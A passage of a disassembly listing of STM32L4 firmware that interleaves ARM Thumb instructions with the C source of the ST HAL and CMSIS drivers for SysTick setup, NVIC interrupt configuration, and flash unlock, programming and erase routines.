 80015b2:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 80015b4:	687b      	ldr	r3, [r7, #4]
 80015b6:	3b01      	subs	r3, #1
 80015b8:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 80015bc:	d301      	bcc.n	80015c2 <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 80015be:	2301      	movs	r3, #1
 80015c0:	e00f      	b.n	80015e2 <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 80015c2:	4a0a      	ldr	r2, [pc, #40]	; (80015ec <SysTick_Config+0x40>)
 80015c4:	687b      	ldr	r3, [r7, #4]
 80015c6:	3b01      	subs	r3, #1
 80015c8:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 80015ca:	210f      	movs	r1, #15
 80015cc:	f04f 30ff 	mov.w	r0, #4294967295
 80015d0:	f7ff ff8e 	bl	80014f0 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 80015d4:	4b05      	ldr	r3, [pc, #20]	; (80015ec <SysTick_Config+0x40>)
 80015d6:	2200      	movs	r2, #0
 80015d8:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 80015da:	4b04      	ldr	r3, [pc, #16]	; (80015ec <SysTick_Config+0x40>)
 80015dc:	2207      	movs	r2, #7
 80015de:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 80015e0:	2300      	movs	r3, #0
}
 80015e2:	4618      	mov	r0, r3
 80015e4:	3708      	adds	r7, #8
 80015e6:	46bd      	mov	sp, r7
 80015e8:	bd80      	pop	{r7, pc}
 80015ea:	bf00      	nop
 80015ec:	e000e010 	.word	0xe000e010

080015f0 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80015f0:	b580      	push	{r7, lr}
 80015f2:	b082      	sub	sp, #8
 80015f4:	af00      	add	r7, sp, #0
 80015f6:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 80015f8:	6878      	ldr	r0, [r7, #4]
 80015fa:	f7ff ff29 	bl	8001450 <__NVIC_SetPriorityGrouping>
}
 80015fe:	bf00      	nop
 8001600:	3708      	adds	r7, #8
 8001602:	46bd      	mov	sp, r7
 8001604:	bd80      	pop	{r7, pc}

08001606 <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 8001606:	b580      	push	{r7, lr}
 8001608:	b086      	sub	sp, #24
 800160a:	af00      	add	r7, sp, #0
 800160c:	4603      	mov	r3, r0
 800160e:	60b9      	str	r1, [r7, #8]
 8001610:	607a      	str	r2, [r7, #4]
 8001612:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 8001614:	2300      	movs	r3, #0
 8001616:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 8001618:	f7ff ff3e 	bl	8001498 <__NVIC_GetPriorityGrouping>
 800161c:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 800161e:	687a      	ldr	r2, [r7, #4]
 8001620:	68b9      	ldr	r1, [r7, #8]
 8001622:	6978      	ldr	r0, [r7, #20]
 8001624:	f7ff ff8e 	bl	8001544 <NVIC_EncodePriority>
 8001628:	4602      	mov	r2, r0
 800162a:	f997 300f 	ldrsb.w	r3, [r7, #15]
 800162e:	4611      	mov	r1, r2
 8001630:	4618      	mov	r0, r3
 8001632:	f7ff ff5d 	bl	80014f0 <__NVIC_SetPriority>
}
 8001636:	bf00      	nop
 8001638:	3718      	adds	r7, #24
 800163a:	46bd      	mov	sp, r7
 800163c:	bd80      	pop	{r7, pc}

0800163e <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 800163e:	b580      	push	{r7, lr}
 8001640:	b082      	sub	sp, #8
 8001642:	af00      	add	r7, sp, #0
 8001644:	4603      	mov	r3, r0
 8001646:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 8001648:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800164c:	4618      	mov	r0, r3
 800164e:	f7ff ff31 	bl	80014b4 <__NVIC_EnableIRQ>
}
 8001652:	bf00      	nop
 8001654:	3708      	adds	r7, #8
 8001656:	46bd      	mov	sp, r7
 8001658:	bd80      	pop	{r7, pc}

0800165a <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 800165a:	b580      	push	{r7, lr}
 800165c:	b082      	sub	sp, #8
 800165e:	af00      	add	r7, sp, #0
 8001660:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 8001662:	6878      	ldr	r0, [r7, #4]
 8001664:	f7ff ffa2 	bl	80015ac <SysTick_Config>
 8001668:	4603      	mov	r3, r0
}
 800166a:	4618      	mov	r0, r3
 800166c:	3708      	adds	r7, #8
 800166e:	46bd      	mov	sp, r7
 8001670:	bd80      	pop	{r7, pc}
	...

08001674 <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 8001674:	b580      	push	{r7, lr}
 8001676:	b086      	sub	sp, #24
 8001678:	af00      	add	r7, sp, #0
 800167a:	60f8      	str	r0, [r7, #12]
 800167c:	60b9      	str	r1, [r7, #8]
 800167e:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 8001682:	2300      	movs	r3, #0
 8001684:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 8001686:	4b2f      	ldr	r3, [pc, #188]	; (8001744 <HAL_FLASH_Program+0xd0>)
 8001688:	781b      	ldrb	r3, [r3, #0]
 800168a:	2b01      	cmp	r3, #1
 800168c:	d101      	bne.n	8001692 <HAL_FLASH_Program+0x1e>
 800168e:	2302      	movs	r3, #2
 8001690:	e053      	b.n	800173a <HAL_FLASH_Program+0xc6>
 8001692:	4b2c      	ldr	r3, [pc, #176]	; (8001744 <HAL_FLASH_Program+0xd0>)
 8001694:	2201      	movs	r2, #1
 8001696:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001698:	f24c 3050 	movw	r0, #50000	; 0xc350
 800169c:	f000 f888 	bl	80017b0 <FLASH_WaitForLastOperation>
 80016a0:	4603      	mov	r3, r0
 80016a2:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 80016a4:	7dfb      	ldrb	r3, [r7, #23]
 80016a6:	2b00      	cmp	r3, #0
 80016a8:	d143      	bne.n	8001732 <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80016aa:	4b26      	ldr	r3, [pc, #152]	; (8001744 <HAL_FLASH_Program+0xd0>)
 80016ac:	2200      	movs	r2, #0
 80016ae:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80016b0:	4b25      	ldr	r3, [pc, #148]	; (8001748 <HAL_FLASH_Program+0xd4>)
 80016b2:	681b      	ldr	r3, [r3, #0]
 80016b4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80016b8:	2b00      	cmp	r3, #0
 80016ba:	d009      	beq.n	80016d0 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80016bc:	4b22      	ldr	r3, [pc, #136]	; (8001748 <HAL_FLASH_Program+0xd4>)
 80016be:	681b      	ldr	r3, [r3, #0]
 80016c0:	4a21      	ldr	r2, [pc, #132]	; (8001748 <HAL_FLASH_Program+0xd4>)
 80016c2:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80016c6:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80016c8:	4b1e      	ldr	r3, [pc, #120]	; (8001744 <HAL_FLASH_Program+0xd0>)
 80016ca:	2202      	movs	r2, #2
 80016cc:	771a      	strb	r2, [r3, #28]
 80016ce:	e002      	b.n	80016d6 <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80016d0:	4b1c      	ldr	r3, [pc, #112]	; (8001744 <HAL_FLASH_Program+0xd0>)
 80016d2:	2200      	movs	r2, #0
 80016d4:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 80016d6:	68fb      	ldr	r3, [r7, #12]
 80016d8:	2b00      	cmp	r3, #0
 80016da:	d107      	bne.n	80016ec <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 80016dc:	e9d7 2300 	ldrd	r2, r3, [r7]
 80016e0:	68b8      	ldr	r0, [r7, #8]
 80016e2:	f000 f8bd 	bl	8001860 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 80016e6:	2301      	movs	r3, #1
 80016e8:	613b      	str	r3, [r7, #16]
 80016ea:	e010      	b.n	800170e <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 80016ec:	68fb      	ldr	r3, [r7, #12]
 80016ee:	2b01      	cmp	r3, #1
 80016f0:	d002      	beq.n	80016f8 <HAL_FLASH_Program+0x84>
 80016f2:	68fb      	ldr	r3, [r7, #12]
 80016f4:	2b02      	cmp	r3, #2
 80016f6:	d10a      	bne.n	800170e <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 80016f8:	683b      	ldr	r3, [r7, #0]
 80016fa:	4619      	mov	r1, r3
 80016fc:	68b8      	ldr	r0, [r7, #8]
 80016fe:	f000 f8d5 	bl	80018ac <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 8001702:	68fb      	ldr	r3, [r7, #12]
 8001704:	2b02      	cmp	r3, #2
 8001706:	d102      	bne.n	800170e <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001708:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 800170c:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800170e:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001712:	f000 f84d 	bl	80017b0 <FLASH_WaitForLastOperation>
 8001716:	4603      	mov	r3, r0
 8001718:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 800171a:	693b      	ldr	r3, [r7, #16]
 800171c:	2b00      	cmp	r3, #0
 800171e:	d006      	beq.n	800172e <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 8001720:	4b09      	ldr	r3, [pc, #36]	; (8001748 <HAL_FLASH_Program+0xd4>)
 8001722:	695a      	ldr	r2, [r3, #20]
 8001724:	693b      	ldr	r3, [r7, #16]
 8001726:	43db      	mvns	r3, r3
 8001728:	4907      	ldr	r1, [pc, #28]	; (8001748 <HAL_FLASH_Program+0xd4>)
 800172a:	4013      	ands	r3, r2
 800172c:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 800172e:	f000 f9cf 	bl	8001ad0 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 8001732:	4b04      	ldr	r3, [pc, #16]	; (8001744 <HAL_FLASH_Program+0xd0>)
 8001734:	2200      	movs	r2, #0
 8001736:	701a      	strb	r2, [r3, #0]

  return status;
 8001738:	7dfb      	ldrb	r3, [r7, #23]
}
 800173a:	4618      	mov	r0, r3
 800173c:	3718      	adds	r7, #24
 800173e:	46bd      	mov	sp, r7
 8001740:	bd80      	pop	{r7, pc}
 8001742:	bf00      	nop
 8001744:	2000000c 	.word	0x2000000c
 8001748:	40022000 	.word	0x40022000

0800174c <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 800174c:	b480      	push	{r7}
 800174e:	b083      	sub	sp, #12
 8001750:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 8001752:	2300      	movs	r3, #0
 8001754:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 8001756:	4b0b      	ldr	r3, [pc, #44]	; (8001784 <HAL_FLASH_Unlock+0x38>)
 8001758:	695b      	ldr	r3, [r3, #20]
 800175a:	2b00      	cmp	r3, #0
 800175c:	da0b      	bge.n	8001776 <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 800175e:	4b09      	ldr	r3, [pc, #36]	; (8001784 <HAL_FLASH_Unlock+0x38>)
 8001760:	4a09      	ldr	r2, [pc, #36]	; (8001788 <HAL_FLASH_Unlock+0x3c>)
 8001762:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 8001764:	4b07      	ldr	r3, [pc, #28]	; (8001784 <HAL_FLASH_Unlock+0x38>)
 8001766:	4a09      	ldr	r2, [pc, #36]	; (800178c <HAL_FLASH_Unlock+0x40>)
 8001768:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800176a:	4b06      	ldr	r3, [pc, #24]	; (8001784 <HAL_FLASH_Unlock+0x38>)
 800176c:	695b      	ldr	r3, [r3, #20]
 800176e:	2b00      	cmp	r3, #0
 8001770:	da01      	bge.n	8001776 <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 8001772:	2301      	movs	r3, #1
 8001774:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 8001776:	79fb      	ldrb	r3, [r7, #7]
}
 8001778:	4618      	mov	r0, r3
 800177a:	370c      	adds	r7, #12
 800177c:	46bd      	mov	sp, r7
 800177e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001782:	4770      	bx	lr
 8001784:	40022000 	.word	0x40022000
 8001788:	45670123 	.word	0x45670123
 800178c:	cdef89ab 	.word	0xcdef89ab

08001790 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 8001790:	b480      	push	{r7}
 8001792:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 8001794:	4b05      	ldr	r3, [pc, #20]	; (80017ac <HAL_FLASH_Lock+0x1c>)
 8001796:	695b      	ldr	r3, [r3, #20]
 8001798:	4a04      	ldr	r2, [pc, #16]	; (80017ac <HAL_FLASH_Lock+0x1c>)
 800179a:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 800179e:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 80017a0:	2300      	movs	r3, #0
}
 80017a2:	4618      	mov	r0, r3
 80017a4:	46bd      	mov	sp, r7
 80017a6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017aa:	4770      	bx	lr
 80017ac:	40022000 	.word	0x40022000

080017b0 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 80017b0:	b580      	push	{r7, lr}
 80017b2:	b084      	sub	sp, #16
 80017b4:	af00      	add	r7, sp, #0
 80017b6:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 80017b8:	f7ff fe1a 	bl	80013f0 <HAL_GetTick>
 80017bc:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80017be:	e00d      	b.n	80017dc <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 80017c0:	687b      	ldr	r3, [r7, #4]
 80017c2:	f1b3 3fff 	cmp.w	r3, #4294967295
 80017c6:	d009      	beq.n	80017dc <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 80017c8:	f7ff fe12 	bl	80013f0 <HAL_GetTick>
 80017cc:	4602      	mov	r2, r0
 80017ce:	68fb      	ldr	r3, [r7, #12]
 80017d0:	1ad3      	subs	r3, r2, r3
 80017d2:	687a      	ldr	r2, [r7, #4]
 80017d4:	429a      	cmp	r2, r3
 80017d6:	d801      	bhi.n	80017dc <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 80017d8:	2303      	movs	r3, #3
 80017da:	e036      	b.n	800184a <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80017dc:	4b1d      	ldr	r3, [pc, #116]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 80017de:	691b      	ldr	r3, [r3, #16]
 80017e0:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80017e4:	2b00      	cmp	r3, #0
 80017e6:	d1eb      	bne.n	80017c0 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 80017e8:	4b1a      	ldr	r3, [pc, #104]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 80017ea:	691a      	ldr	r2, [r3, #16]
 80017ec:	4b1a      	ldr	r3, [pc, #104]	; (8001858 <FLASH_WaitForLastOperation+0xa8>)
 80017ee:	4013      	ands	r3, r2
 80017f0:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 80017f2:	68bb      	ldr	r3, [r7, #8]
 80017f4:	2b00      	cmp	r3, #0
 80017f6:	d01e      	beq.n	8001836 <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 80017f8:	4b18      	ldr	r3, [pc, #96]	; (800185c <FLASH_WaitForLastOperation+0xac>)
 80017fa:	685a      	ldr	r2, [r3, #4]
 80017fc:	68bb      	ldr	r3, [r7, #8]
 80017fe:	4313      	orrs	r3, r2
 8001800:	4a16      	ldr	r2, [pc, #88]	; (800185c <FLASH_WaitForLastOperation+0xac>)
 8001802:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 8001804:	68bb      	ldr	r3, [r7, #8]
 8001806:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 800180a:	2b00      	cmp	r3, #0
 800180c:	d007      	beq.n	800181e <FLASH_WaitForLastOperation+0x6e>
 800180e:	4b11      	ldr	r3, [pc, #68]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 8001810:	699a      	ldr	r2, [r3, #24]
 8001812:	68bb      	ldr	r3, [r7, #8]
 8001814:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001818:	490e      	ldr	r1, [pc, #56]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 800181a:	4313      	orrs	r3, r2
 800181c:	618b      	str	r3, [r1, #24]
 800181e:	68bb      	ldr	r3, [r7, #8]
 8001820:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001824:	2b00      	cmp	r3, #0
 8001826:	d004      	beq.n	8001832 <FLASH_WaitForLastOperation+0x82>
 8001828:	4a0a      	ldr	r2, [pc, #40]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 800182a:	68bb      	ldr	r3, [r7, #8]
 800182c:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001830:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 8001832:	2301      	movs	r3, #1
 8001834:	e009      	b.n	800184a <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 8001836:	4b07      	ldr	r3, [pc, #28]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 8001838:	691b      	ldr	r3, [r3, #16]
 800183a:	f003 0301 	and.w	r3, r3, #1
 800183e:	2b00      	cmp	r3, #0
 8001840:	d002      	beq.n	8001848 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 8001842:	4b04      	ldr	r3, [pc, #16]	; (8001854 <FLASH_WaitForLastOperation+0xa4>)
 8001844:	2201      	movs	r2, #1
 8001846:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 8001848:	2300      	movs	r3, #0
}
 800184a:	4618      	mov	r0, r3
 800184c:	3710      	adds	r7, #16
 800184e:	46bd      	mov	sp, r7
 8001850:	bd80      	pop	{r7, pc}
 8001852:	bf00      	nop
 8001854:	40022000 	.word	0x40022000
 8001858:	0002c3fa 	.word	0x0002c3fa
 800185c:	2000000c 	.word	0x2000000c

08001860 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 8001860:	b480      	push	{r7}
 8001862:	b085      	sub	sp, #20
 8001864:	af00      	add	r7, sp, #0
 8001866:	60f8      	str	r0, [r7, #12]
 8001868:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 800186c:	4b0e      	ldr	r3, [pc, #56]	; (80018a8 <FLASH_Program_DoubleWord+0x48>)
 800186e:	695b      	ldr	r3, [r3, #20]
 8001870:	4a0d      	ldr	r2, [pc, #52]	; (80018a8 <FLASH_Program_DoubleWord+0x48>)
 8001872:	f043 0301 	orr.w	r3, r3, #1
 8001876:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001878:	68fb      	ldr	r3, [r7, #12]
 800187a:	683a      	ldr	r2, [r7, #0]
 800187c:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 800187e:	f3bf 8f6f 	isb	sy
}
 8001882:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 8001884:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001888:	f04f 0200 	mov.w	r2, #0
 800188c:	f04f 0300 	mov.w	r3, #0
 8001890:	000a      	movs	r2, r1
 8001892:	2300      	movs	r3, #0
 8001894:	68f9      	ldr	r1, [r7, #12]
 8001896:	3104      	adds	r1, #4
 8001898:	4613      	mov	r3, r2
 800189a:	600b      	str	r3, [r1, #0]
}
 800189c:	bf00      	nop
 800189e:	3714      	adds	r7, #20
 80018a0:	46bd      	mov	sp, r7
 80018a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018a6:	4770      	bx	lr
 80018a8:	40022000 	.word	0x40022000

080018ac <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 80018ac:	b480      	push	{r7}
 80018ae:	b089      	sub	sp, #36	; 0x24
 80018b0:	af00      	add	r7, sp, #0
 80018b2:	6078      	str	r0, [r7, #4]
 80018b4:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 80018b6:	2340      	movs	r3, #64	; 0x40
 80018b8:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 80018ba:	687b      	ldr	r3, [r7, #4]
 80018bc:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 80018be:	683b      	ldr	r3, [r7, #0]
 80018c0:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 80018c2:	4b14      	ldr	r3, [pc, #80]	; (8001914 <FLASH_Program_Fast+0x68>)
 80018c4:	695b      	ldr	r3, [r3, #20]
 80018c6:	4a13      	ldr	r2, [pc, #76]	; (8001914 <FLASH_Program_Fast+0x68>)
 80018c8:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 80018cc:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 80018ce:	f3ef 8310 	mrs	r3, PRIMASK
 80018d2:	60fb      	str	r3, [r7, #12]
  return(result);
 80018d4:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 80018d6:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 80018d8:	b672      	cpsid	i
}
 80018da:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 80018dc:	697b      	ldr	r3, [r7, #20]
 80018de:	681a      	ldr	r2, [r3, #0]
 80018e0:	69bb      	ldr	r3, [r7, #24]
 80018e2:	601a      	str	r2, [r3, #0]
    dest_addr++;
 80018e4:	69bb      	ldr	r3, [r7, #24]
 80018e6:	3304      	adds	r3, #4
 80018e8:	61bb      	str	r3, [r7, #24]
    src_addr++;
 80018ea:	697b      	ldr	r3, [r7, #20]
 80018ec:	3304      	adds	r3, #4
 80018ee:	617b      	str	r3, [r7, #20]
    row_index--;
 80018f0:	7ffb      	ldrb	r3, [r7, #31]
 80018f2:	3b01      	subs	r3, #1
 80018f4:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 80018f6:	7ffb      	ldrb	r3, [r7, #31]
 80018f8:	2b00      	cmp	r3, #0
 80018fa:	d1ef      	bne.n	80018dc <FLASH_Program_Fast+0x30>
 80018fc:	693b      	ldr	r3, [r7, #16]
 80018fe:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001900:	68bb      	ldr	r3, [r7, #8]
 8001902:	f383 8810 	msr	PRIMASK, r3
}
 8001906:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001908:	bf00      	nop
 800190a:	3724      	adds	r7, #36	; 0x24
 800190c:	46bd      	mov	sp, r7
 800190e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001912:	4770      	bx	lr
 8001914:	40022000 	.word	0x40022000

08001918 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 8001918:	b580      	push	{r7, lr}
 800191a:	b084      	sub	sp, #16
